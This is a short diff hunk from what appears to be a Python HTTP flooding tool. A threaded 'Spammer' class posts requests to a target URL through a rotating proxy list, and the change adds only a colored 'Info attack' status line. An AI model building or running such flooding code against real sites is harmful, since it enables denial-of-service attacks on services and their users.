@@ -27,6 +27,7 @@ class Spammer(threading.Thread):
         req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
         sys.stdout.write("Thread #%4d | %4d\%d | Proxy@%s"%(self.num, N, len(self.lista), self.lista[N]))
+        print(f"\033[100m \033[44mLogok.py \033[33mInfo attack \033[32m" +str(url)+ " \033[31mpow\033[0m")
             
     def run(self):
         global N
